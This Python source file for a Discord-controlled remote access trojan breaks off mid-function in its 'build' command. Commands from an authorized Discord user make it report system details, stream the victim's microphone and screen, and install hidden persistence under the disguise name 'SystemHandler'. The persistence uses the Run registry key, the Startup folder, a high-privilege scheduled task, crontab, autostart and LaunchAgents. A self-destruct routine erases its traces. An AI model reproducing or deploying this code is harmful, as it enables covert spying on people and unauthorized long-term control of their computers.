import asyncio
import base64
import datetime
import discord
import io
import logging
import os
import platform
import psutil
import shutil
import socket
import subprocess
import sys
import tempfile
import time
from discord.ext import commands
from pathlib import Path
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('DiscordBot')

# Bot configuration
TOKEN = "REPLACE_WITH_BOT_TOKEN"
AUTHORIZED_USER_ID = REPLACE_WITH_USER_ID
COMMAND_PREFIX = '!'
COMPUTER_NAME = socket.gethostname()
PROCESS_NAME = "SystemHandler"

# Get actual username for Windows startup folder
if platform.system() == "Windows":
    try:
        USER_NAME = os.getlogin()
    except:
        # Fallback to environment variable
        USER_NAME = os.environ.get('USERNAME', 'User')
else:
    USER_NAME = os.environ.get('USER', 'user')

# Create bot instance with required intents
intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)

# Global variables for bot state
screen_streaming = False
streaming_task = None
audio_streaming = False
voice_client = None

# Dictionary to track computer-specific channels
computer_channels = {}

# Command help dictionary
CMD_HELP = {
    f"{COMMAND_PREFIX}mic": "Stream microphone audio through the bot",
    f"{COMMAND_PREFIX}mic stop": "Stop streaming microphone audio",
    f"{COMMAND_PREFIX}screen": "Stream the screen through the bot",
    f"{COMMAND_PREFIX}screen off": "Stop streaming the screen",
    f"{COMMAND_PREFIX}startup": "Add the bot to startup to run when the computer starts",
    f"{COMMAND_PREFIX}panic": "Completely remove the bot from the computer",
    f"{COMMAND_PREFIX}info": "Display system information",
    f"{COMMAND_PREFIX}commands": "Show this help message",
    f"{COMMAND_PREFIX}build": "Build the bot into an executable file with custom icon"
}

@bot.event
async def on_ready():
    """Event handler for when the bot is connected and ready"""
    logger.info(f"Bot connected as {bot.user}")
    
    # Initialize the computer_channels dictionary to track which channels belong to which computers
    global computer_channels
    
    # Find or create a control channel for this computer
    for guild in bot.guilds:
        # Find all computer categories in the guild
        all_computer_categories = [category for category in guild.categories 
                                  if category.name.startswith("PC-") or 
                                     category.name == COMPUTER_NAME]
        
        # If no categories found, create one for this computer
        if not all_computer_categories or not any(cat.name == COMPUTER_NAME for cat in all_computer_categories):
            category = await guild.create_category(name=COMPUTER_NAME)
            logger.info(f"Created category: {COMPUTER_NAME}")
        else:
            # Get the category for this computer
            category = discord.utils.get(guild.categories, name=COMPUTER_NAME)
            if not category and all_computer_categories:
                # If no category with COMPUTER_NAME but other computer categories exist,
                # use the first one as an example
                category = await guild.create_category(name=COMPUTER_NAME)
        
        # Create control channel if it doesn't exist
        channel_name = f"control-{COMPUTER_NAME.lower()}"
        control_channel = discord.utils.get(guild.text_channels, name=channel_name)
        
        if not control_channel and category:
            control_channel = await category.create_text_channel(name=channel_name)
            logger.info(f"Created control channel: {channel_name}")
        
        if control_channel:
            # Register this channel with this computer
            computer_channels[control_channel.id] = COMPUTER_NAME
            logger.info(f"Registered channel {control_channel.id} for computer {COMPUTER_NAME}")
            
            # Post system info on startup
            await send_system_info(control_channel)
            
            # Notify about bot startup
            startup_embed = discord.Embed(
                title="Bot Started",
                description=f"Bot is now running on {COMPUTER_NAME}",
                color=discord.Color.green(),
                timestamp=datetime.datetime.now()
            )
            startup_embed.add_field(name="Process Name", value=PROCESS_NAME, inline=True)
            startup_embed.add_field(name="PID", value=os.getpid(), inline=True)
            startup_embed.add_field(name="Started At", value=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), inline=True)
            
            await control_channel.send(embed=startup_embed)

@bot.event
async def on_command_error(ctx, error):
    """Handle command errors"""
    if isinstance(error, commands.CommandNotFound):
        return  # Ignore command not found errors
    
    # Log other errors
    logger.error(f"Command error: {error}")
    
    # Send error message to user
    error_embed = discord.Embed(
        title="Command Error",
        description=str(error),
        color=discord.Color.red(),
        timestamp=datetime.datetime.now()
    )
    await ctx.send(embed=error_embed)

@bot.command(name="commands")
async def show_commands(ctx):
    """Display help information about available commands"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
        
    embed = discord.Embed(
        title="Bot Commands",
        description="List of available commands",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    
    for cmd, desc in CMD_HELP.items():
        embed.add_field(name=cmd, value=desc, inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name="info")
async def info_command(ctx):
    """Send system information to the channel"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
            
    await send_system_info(ctx)

async def send_system_info(ctx):
    """Generate and send system information"""
    system_info = get_system_info()
    embed = discord.Embed(
        title=f"System Information for {COMPUTER_NAME}",
        description="Current system status and information",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    
    for key, value in system_info.items():
        embed.add_field(name=key, value=value, inline=False)
    
    await ctx.send(embed=embed)

def get_system_info():
    """Collect system information"""
    try:
        info = {
            "OS": platform.platform(),
            "Username": USER_NAME,
            "CPU": platform.processor(),
            "CPU Usage": f"{psutil.cpu_percent()}%",
            "RAM": f"{psutil.virtual_memory().percent}% used",
            "Disk": f"{psutil.disk_usage('/').percent}% used",
            "Python Version": platform.python_version(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            "Process Name": PROCESS_NAME,
            "Process ID": os.getpid(),
            "User": os.getlogin() if hasattr(os, 'getlogin') else USER_NAME
        }
    except Exception as e:
        info = {
            "OS": platform.platform(),
            "Username": USER_NAME,
            "CPU": platform.processor(),
            "Python Version": platform.python_version(),
            "Error": str(e)
        }
    return info

@bot.command(name="mic")
async def mic_command(ctx, action=None):
    """Stream microphone audio to voice channel"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    global audio_streaming, voice_client
    
    if action == "stop":
        if audio_streaming:
            audio_streaming = False
            if voice_client and voice_client.is_connected():
                if voice_client.is_playing():
                    voice_client.stop()
                await voice_client.disconnect()
                voice_client = None
            await ctx.send("🎤 Microphone streaming stopped.")
        else:
            await ctx.send("❌ No microphone streaming is active.")
        return
    
    # Check if the user is in a voice channel
    if not ctx.author.voice:
        await ctx.send("❌ You must be in a voice channel to use this command.")
        return
    
    # Check if already streaming
    if audio_streaming:
        await ctx.send("❌ Already streaming microphone. Use `!mic stop` to stop.")
        return
    
    # Join the user's voice channel
    try:
        voice_channel = ctx.author.voice.channel
        voice_client = await voice_channel.connect()
        await ctx.send(f"🎤 Connected to voice channel: {voice_channel.name}")
        
        # Start streaming audio
        audio_streaming = True
        asyncio.create_task(stream_microphone(ctx))
    except Exception as e:
        await ctx.send(f"❌ Failed to connect to voice channel: {e}")
        logger.error(f"Voice connection error: {e}")

async def stream_microphone(ctx):
    """Stream microphone audio to the connected voice channel"""
    global audio_streaming, voice_client
    
    try:
        # Real microphone streaming using PyAudio
        import pyaudio
        
        # Configure PyAudio for microphone streaming
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 48000  # Discord voice standard rate
        
        p = pyaudio.PyAudio()
        
        # Open microphone stream
        stream = p.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)
        
        await ctx.send("🎤 Microphone streaming started. Live audio is now being transmitted.")
        
        # Create an audio source that reads from the microphone
        class MicrophoneSource(discord.AudioSource):
            def __init__(self):
                self.started = False
            
            def read(self):
                if not audio_streaming:
                    return b''
                # Read data from microphone
                try:
                    data = stream.read(CHUNK, exception_on_overflow=False)
                    return data
                except Exception as e:
                    logger.error(f"Error reading from microphone: {e}")
                    return b''
                    
            def cleanup(self):
                stream.stop_stream()
                stream.close()
                p.terminate()
        
        # Create an audio source from the microphone
        source = MicrophoneSource()
        
        # Play the audio source if voice client is available
        if voice_client:
            voice_client.play(discord.PCMAudio(source))
        
        # Keep the connection open while streaming
        while audio_streaming and voice_client and voice_client.is_connected():
            await asyncio.sleep(0.5)  # Check status every half second
            
        # Clean up resources
        if voice_client and voice_client.is_connected():
            if voice_client.is_playing():
                voice_client.stop()
            await voice_client.disconnect()
            voice_client = None
            
        source.cleanup()
        audio_streaming = False
        await ctx.send("🎤 Microphone streaming ended.")
        
    except Exception as e:
        audio_streaming = False
        if voice_client and voice_client.is_connected():
            await voice_client.disconnect()
            voice_client = None
        await ctx.send(f"❌ Error in microphone streaming: {e}")
        logger.error(f"Microphone streaming error: {e}")

@bot.command(name="screen")
async def screen_command(ctx, action=None):
    """Command to start or stop screen streaming"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
        
    global screen_streaming, streaming_task
    
    if action == "off":
        if screen_streaming and streaming_task:
            screen_streaming = False
            streaming_task.cancel()
            streaming_task = None
            await ctx.send("🖥️ Screen streaming stopped.")
        else:
            await ctx.send("❌ No screen streaming is active.")
        return
    
    # Check if already streaming
    if screen_streaming:
        await ctx.send("❌ Already streaming screen. Use `!screen off` to stop.")
        return
    
    # Start screen streaming
    try:
        screen_streaming = True
        streaming_task = asyncio.create_task(stream_screen(ctx))
        await ctx.send("🖥️ Screen streaming started.")
    except Exception as e:
        screen_streaming = False
        await ctx.send(f"❌ Failed to start screen streaming: {e}")
        logger.error(f"Screen streaming error: {e}")

async def stream_screen(ctx):
    """Stream screen captures to Discord channel as video stream with ultra-fast refresh rate"""
    global screen_streaming
    
    try:
        await ctx.send("🖥️ Starting real-time screen streaming...")
        
        if ImageGrab is None:
            await ctx.send("⚠️ Screen capture is not available in this environment. This feature requires PIL.ImageGrab.")
            screen_streaming = False
            return
        
        # Create a text channel for streaming if not already exists
        guild = ctx.guild
        category = discord.utils.get(guild.categories, name=COMPUTER_NAME)
        if not category:
            category = await guild.create_category(name=COMPUTER_NAME)
            
        stream_channel_name = f"screen-stream-{COMPUTER_NAME.lower()}"
        stream_channel = discord.utils.get(guild.text_channels, name=stream_channel_name)
        
        if not stream_channel and category:
            stream_channel = await category.create_text_channel(name=stream_channel_name)
            await ctx.send(f"Created dedicated streaming channel: #{stream_channel_name}")
        
        if not stream_channel:
            stream_channel = ctx.channel  # Fallback to the current channel
        
        # Send initial message to the streaming channel
        stream_embed = discord.Embed(
            title="🖥️ Ultra-Fast Live Screen Stream",
            description=f"Live screen streaming from {COMPUTER_NAME} with 1ms refresh rate",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        await stream_channel.send(embed=stream_embed)
        
        # Create a stream message that we'll update with new screenshots
        stream_message = await stream_channel.send("Starting screen stream with maximum performance...")
        await ctx.send(f"🔴 Ultra-fast streaming started in #{stream_channel.name}")
        
        frame_count = 0
        start_time = time.time()
        last_update_time = 0
        
        # Set up a background worker for screen capture to maximize performance
        async def capture_worker():
            nonlocal frame_count, last_update_time, stream_message
            while screen_streaming:
                try:
                    # Use time-based throttling instead of sleep for faster refresh rate
                    current_time = time.time()
                    elapsed_since_last = current_time - last_update_time
                    
                    # Only continue if 1ms has passed since last frame (up to 1000 FPS)
                    if elapsed_since_last < 0.001:
                        # Use minimal sleep to prevent CPU from reaching 100%
                        await asyncio.sleep(0.0001)
                        continue
                    
                    # Update timestamp
                    last_update_time = current_time
                    
                    # Capture screenshot at optimal resolution for speed
                    screenshot = ImageGrab.grab()
                    
                    # Resize for faster transmission
                    width, height = screenshot.size
                    new_width = min(1280, width)  # Limit width to 1280 pixels max
                    ratio = new_width / width
                    new_height = int(height * ratio)
                    screenshot = screenshot.resize((new_width, new_height))
                    
                    # Optimize compression for speed - use lower quality for faster transfers
                    img_byte_arr = io.BytesIO()
                    screenshot.save(img_byte_arr, format='JPEG', quality=50)  # Lower quality for higher speed
                    img_byte_arr.seek(0)
                    
                    # Create a new file for each frame
                    file = discord.File(fp=img_byte_arr, filename=f"screen_{frame_count}.jpg")
                    
                    # Edit the message with the new screenshot
                    try:
                        # Delete previous message and send new one (faster than editing)
                        await stream_message.delete()
                        frame_count += 1
                        stream_message = await stream_channel.send(
                            f"🔴 ULTRA-LIVE: Frame {frame_count} - {datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]}",
                            file=file
                        )
                    except Exception as e:
                        # If error occurs (e.g., message deleted), create a new one
                        frame_count += 1
                        stream_message = await stream_channel.send(
                            f"🔴 ULTRA-LIVE: Frame {frame_count} - {datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]}",
                            file=file
                        )
                    
                    # Show FPS every 10 frames
                    if frame_count % 10 == 0:
                        elapsed = time.time() - start_time
                        fps = frame_count / elapsed
                        await ctx.send(f"🚀 Stream performance: {fps:.2f} FPS (Maximum speed mode)", delete_after=2.0)
                    
                except Exception as e:
                    logger.error(f"Frame capture error: {e}")
                    await asyncio.sleep(0.1)  # Brief delay on error
        
        # Start the worker task
        worker = asyncio.create_task(capture_worker())
        
        # Wait until streaming is stopped
        while screen_streaming:
            await asyncio.sleep(0.1)  # Check status periodically
            
        # Cleanup worker
        if worker:
            worker.cancel()
        
        if stream_message:
            await stream_message.edit(content="🛑 Screen streaming ended.")
            
        await ctx.send("🖥️ Screen streaming stopped.")
            
    except asyncio.CancelledError:
        # Task was cancelled, clean exit
        screen_streaming = False
        logger.info("Screen streaming task cancelled")
        await ctx.send("🖥️ Screen streaming cancelled.")
    
    except Exception as e:
        screen_streaming = False
        await ctx.send(f"❌ Error in screen streaming: {e}")
        logger.error(f"Screen streaming error: {e}")

@bot.command(name="startup")
async def startup_command(ctx):
    """Add the bot to system startup"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
        
    try:
        result = setup_startup()
        if result:
            await ctx.send("✅ Bot successfully added to system startup.")
        else:
            await ctx.send("❌ Failed to add bot to system startup.")
    except Exception as e:
        await ctx.send(f"❌ Error setting up startup: {e}")
        logger.error(f"Startup setup error: {e}")

def setup_startup():
    """Set up the script to run at system startup in hidden mode"""
    try:
        # Get the path to the current script
        script_path = os.path.abspath(sys.argv[0])
        
        # Create a launcher script that runs the bot hidden
        startup_script_path = os.path.join(os.path.dirname(script_path), f"{PROCESS_NAME}_launcher.pyw")
        
        # For Windows systems, also create a VBS launcher which has even better hiding
        if platform.system() == "Windows":
            vbs_path = os.path.join(os.path.dirname(script_path), f"{PROCESS_NAME}_invisible.vbs")
            with open(vbs_path, "w") as vbs:
                vbs.write(f"""Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "{startup_script_path}" & Chr(34), 0
Set WshShell = Nothing
""")
            logger.info(f"Created VBS invisible launcher at {vbs_path}")
            
            # Get actual user's Startup folder path
            startup_folder = os.path.join(f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            
            # Copy VBS launcher to Startup folder
            if os.path.exists(startup_folder):
                startup_vbs = os.path.join(startup_folder, f"{PROCESS_NAME}_startup.vbs")
                shutil.copy2(vbs_path, startup_vbs)
                logger.info(f"Copied invisible launcher to Startup folder: {startup_vbs}")
        
        # Write a launcher script that makes the bot completely invisible
        with open(startup_script_path, "w") as launcher:
            launcher.write(f"""#!/usr/bin/env python
import subprocess
import os
import sys
import platform
import time

# Path to the bot script
bot_script = "{script_path}"

def hide_process():
    \"\"\"Make this process completely invisible\"\"\"
    if platform.system() == "Windows":
        try:
            # Hide console window for Windows
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            
            # Get the console window handle
            hwnd = kernel32.GetConsoleWindow()
            
            # Hide the console window
            if hwnd != 0:
                user32.ShowWindow(hwnd, 0)
        except:
            pass

# Hide this launcher first
hide_process()

# Create a detached process with no window
if platform.system() == "Windows":
    # On Windows, use pythonw to hide the console window
    try:
        # Method 1: Use STARTUPINFO
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
        subprocess.Popen(
            ["pythonw", bot_script, "--hidden"],
            startupinfo=startupinfo, 
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=False
        )
    except:
        # Method 2: Fallback to simpler method
        subprocess.Popen(
            ["pythonw", bot_script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.DETACHED_PROCESS,
            shell=False
        )
else:
    # On Unix-like systems, use nohup to keep running after terminal closes
    try:
        # Method 1: Using preexec_fn to create new session
        subprocess.Popen(
            ["python3", bot_script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            preexec_fn=os.setsid,
            start_new_session=True,
            shell=False
        )
    except:
        # Method 2: Direct approach
        os.system(f"nohup python3 '{bot_script}' > /dev/null 2>&1 &")

# Exit the launcher immediately to prevent any window from appearing
time.sleep(1)  # Give the process time to start
sys.exit(0)
""")
        
        logger.info(f"Created stealth launcher at {startup_script_path}")
        
        if platform.system() == "Windows":
            # Windows startup method
            try:
                # Windows registry method - with safe import check
                try:
                    import winreg
                    
                    # Create startup registry key
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                    
                    # Use the VBS launcher which is completely invisible
                    vbs_path = os.path.join(os.path.dirname(script_path), f"{PROCESS_NAME}_invisible.vbs")
                    winreg.SetValueEx(key, PROCESS_NAME, 0, winreg.REG_SZ, f'wscript.exe "{vbs_path}"')
                    winreg.CloseKey(key)
                    logger.info("Added invisible VBS launcher to registry startup")
                except (ImportError, AttributeError, NameError) as e:
                    # Registry access not available in this environment
                    logger.warning(f"Windows registry access not available: {e}")
            except Exception as reg_err:
                logger.error(f"Registry error: {reg_err}")
            
            # Create a copy in the AppData folder for persistence
            try:
                if "APPDATA" in os.environ:
                    appdata_path = os.path.join(os.environ["APPDATA"], f"{PROCESS_NAME}.pyw")
                    shutil.copy2(script_path, appdata_path)
                    logger.info(f"Created copy at {appdata_path}")
                    
                    # Create a second startup method using Task Scheduler
                    task_cmd = f'schtasks /create /tn "{PROCESS_NAME}" /tr "wscript.exe \\"{vbs_path}\\"" /sc onlogon /rl highest /f'
                    subprocess.run(task_cmd, shell=True, capture_output=True)
                    logger.info("Added task to scheduler")
            except Exception as app_err:
                logger.error(f"AppData error: {app_err}")
            
        elif platform.system() == "Linux":
            # Linux startup method
            home_dir = os.path.expanduser("~")
            autostart_dir = os.path.join(home_dir, ".config", "autostart")
            
            # Create autostart directory if it doesn't exist
            os.makedirs(autostart_dir, exist_ok=True)
            
            # Create .desktop file
            desktop_file_path = os.path.join(autostart_dir, f"{PROCESS_NAME}.desktop")
            with open(desktop_file_path, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name={PROCESS_NAME}
Exec=python3 "{startup_script_path}"
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
            os.chmod(desktop_file_path, 0o755)
            logger.info(f"Created desktop entry at {desktop_file_path}")
            
            # Add to crontab as well for persistence
            try:
                cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot python3 {startup_script_path}") | crontab -'
                subprocess.run(cron_cmd, shell=True)
                logger.info("Added to crontab")
            except Exception as cron_err:
                logger.error(f"Crontab error: {cron_err}")
            
        elif platform.system() == "Darwin":  # macOS
            # macOS startup method
            home_dir = os.path.expanduser("~")
            launch_agents_dir = os.path.join(home_dir, "Library", "LaunchAgents")
            
            # Create LaunchAgents directory if it doesn't exist
            os.makedirs(launch_agents_dir, exist_ok=True)
            
            # Create plist file
            plist_file_path = os.path.join(launch_agents_dir, f"com.{PROCESS_NAME}.plist")
            with open(plist_file_path, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{PROCESS_NAME}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{startup_script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>""")
            logger.info(f"Created plist at {plist_file_path}")
            
            # Load the plist
            try:
                subprocess.run(["launchctl", "load", plist_file_path])
                logger.info("Loaded with launchctl")
            except Exception as launch_err:
                logger.error(f"Launchctl error: {launch_err}")
            
        return True
    except Exception as e:
        logger.error(f"Error setting up startup: {e}")
        return False

@bot.command(name="panic")
async def panic_command(ctx):
    """Delete the bot from the system"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
        
    try:
        # Confirm panic command
        confirm_embed = discord.Embed(
            title="⚠️ PANIC COMMAND CONFIRMATION ⚠️",
            description="This will completely remove the bot from your computer.",
            color=discord.Color.red(),
            timestamp=datetime.datetime.now()
        )
        confirm_embed.add_field(name="Confirm", value=f"Type `{COMMAND_PREFIX}panic confirm` to proceed", inline=False)
        confirm_embed.add_field(name="Warning", value="This action cannot be undone!", inline=False)
        
        await ctx.send(embed=confirm_embed)
        
        # Wait for confirmation
        def check(message):
            return message.author == ctx.author and message.content.lower() == f"{COMMAND_PREFIX}panic confirm"
        
        try:
            # Wait for confirmation message for 30 seconds
            await bot.wait_for('message', check=check, timeout=30.0)
            
            # User confirmed, proceed with removal
            await ctx.send("🚨 PANIC MODE ACTIVATED - Bot will self-destruct from the system!")
            
            # Remove from startup locations
            await remove_startup(ctx)
            
            # Create self-destruct script and execute it
            await execute_self_destruct(ctx)
            
        except asyncio.TimeoutError:
            # User didn't confirm in time
            await ctx.send("❌ Panic mode cancelled - confirmation timeout.")
            
    except Exception as e:
        await ctx.send(f"❌ Error in panic command: {e}")
        logger.error(f"Panic command error: {e}")

async def remove_startup(ctx):
    """Remove bot from startup locations"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        script_dir = os.path.dirname(script_path)
        
        # Remove the stealth launcher if it exists
        launcher_path = os.path.join(script_dir, f"{PROCESS_NAME}_launcher.pyw")
        if os.path.exists(launcher_path):
            try:
                os.remove(launcher_path)
                logger.info(f"Removed launcher script: {launcher_path}")
                await ctx.send("✅ Removed stealth launcher script")
            except Exception as e:
                logger.error(f"Failed to remove launcher: {e}")
        
        # Remove VBS launcher
        vbs_path = os.path.join(script_dir, f"{PROCESS_NAME}_invisible.vbs")
        if os.path.exists(vbs_path):
            try:
                os.remove(vbs_path)
                logger.info(f"Removed VBS launcher: {vbs_path}")
                await ctx.send("✅ Removed VBS launcher")
            except Exception as e:
                logger.error(f"Failed to remove VBS launcher: {e}")
        
        if platform.system() == "Windows":
            # Remove from Windows registry
            try:
                # Safely handle Windows registry access
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(key, PROCESS_NAME)
                    winreg.CloseKey(key)
                    logger.info("Removed from registry startup")
                    await ctx.send("✅ Removed from registry startup")
                except (ImportError, AttributeError, NameError) as e:
                    logger.warning(f"Windows registry access not available: {e}")
            except Exception as reg_err:
                logger.error(f"Registry removal error: {reg_err}")
            
            # Remove from Startup folder
            try:
                startup_folder = os.path.join(f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                startup_vbs = os.path.join(startup_folder, f"{PROCESS_NAME}_startup.vbs")
                if os.path.exists(startup_vbs):
                    os.remove(startup_vbs)
                    logger.info(f"Removed from Startup folder: {startup_vbs}")
                    await ctx.send("✅ Removed from Startup folder")
            except Exception as startup_err:
                logger.error(f"Startup folder removal error: {startup_err}")
            
            # Remove AppData copy
            try:
                if "APPDATA" in os.environ:
                    appdata_path = os.path.join(os.environ["APPDATA"], f"{PROCESS_NAME}.pyw")
                    if os.path.exists(appdata_path):
                        os.remove(appdata_path)
                        logger.info(f"Removed copy from {appdata_path}")
                        await ctx.send("✅ Removed from AppData folder")
            except Exception as app_err:
                logger.error(f"AppData removal error: {app_err}")
            
            # Remove task scheduler entry
            try:
                task_cmd = f'schtasks /delete /tn "{PROCESS_NAME}" /f'
                subprocess.run(task_cmd, shell=True, capture_output=True)
                logger.info("Removed from task scheduler")
                await ctx.send("✅ Removed from task scheduler")
            except Exception as task_err:
                logger.error(f"Task scheduler removal error: {task_err}")
                
        elif platform.system() == "Linux":
            # Remove from Linux startup
            try:
                home_dir = os.path.expanduser("~")
                desktop_file_path = os.path.join(home_dir, ".config", "autostart", f"{PROCESS_NAME}.desktop")
                if os.path.exists(desktop_file_path):
                    os.remove(desktop_file_path)
                    logger.info(f"Removed desktop entry from {desktop_file_path}")
                    await ctx.send("✅ Removed from Linux autostart")
            except Exception as desktop_err:
                logger.error(f"Desktop entry removal error: {desktop_err}")
            
            # Remove from crontab
            try:
                cron_cmd = f'crontab -l | grep -v "{script_path}" | crontab -'
                subprocess.run(cron_cmd, shell=True)
                logger.info("Removed from crontab")
                await ctx.send("✅ Removed from crontab")
            except Exception as cron_err:
                logger.error(f"Crontab removal error: {cron_err}")
                
        elif platform.system() == "Darwin":  # macOS
            # Remove from macOS startup
            try:
                home_dir = os.path.expanduser("~")
                plist_file_path = os.path.join(home_dir, "Library", "LaunchAgents", f"com.{PROCESS_NAME}.plist")
                if os.path.exists(plist_file_path):
                    # Unload the plist
                    subprocess.run(["launchctl", "unload", plist_file_path])
                    os.remove(plist_file_path)
                    logger.info(f"Removed and unloaded plist from {plist_file_path}")
                    await ctx.send("✅ Removed from macOS LaunchAgents")
            except Exception as plist_err:
                logger.error(f"Plist removal error: {plist_err}")
                
    except Exception as e:
        logger.error(f"Error removing from startup: {e}")
        await ctx.send(f"❌ Error removing from startup: {e}")

async def execute_self_destruct(ctx):
    """Create a script to delete the bot file and terminate itself"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        
        # Create a temporary file with deletion code
        fd, temp_path = tempfile.mkstemp(suffix='.py')
        
        with os.fdopen(fd, 'w') as f:
            f.write(f"""import os
import sys
import time
import subprocess
import glob

# Path to the bot script
bot_path = "{script_path}"

# Wait a moment to ensure the bot has exited
time.sleep(2)

try:
    # Delete the bot file
    if os.path.exists(bot_path):
        os.remove(bot_path)
        print(f"Deleted bot file: {{bot_path}}")
    
    # Delete any related files in the same directory
    bot_dir = os.path.dirname(bot_path)
    for pattern in ["{PROCESS_NAME}*", "*.pyw", "*launcher*"]:
        for file in glob.glob(os.path.join(bot_dir, pattern)):
            try:
                os.remove(file)
                print(f"Deleted related file: {{file}}")
            except:
                pass

    # Delete this script itself
    os.remove("{temp_path}")
except Exception as e:
    print(f"Error during cleanup: {{e}}")
""")
        
        # Make the script executable
        os.chmod(temp_path, 0o755)
        
        # Send final goodbye message
        await ctx.send("🔥 Bot is being removed from the system. Goodbye!")
        
        # Execute the self-destruct script in a separate process
        if platform.system() == "Windows":
            # Use the appropriate technique for Windows
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.Popen(["python", temp_path], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                # Fallback method
                subprocess.Popen(["python", temp_path], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            # Unix systems
            try:
                subprocess.Popen(["python3", temp_path], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                subprocess.Popen(["python3", temp_path], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Exit the bot process
        await bot.close()
        
    except Exception as e:
        await ctx.send(f"❌ Self-destruct error: {e}")
        logger.error(f"Self-destruct error: {e}")

@bot.command(name="build")
async def build_command(ctx):
    """Build the bot into an executable with custom icon"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    try:
        # Create build directory if it doesn't exist
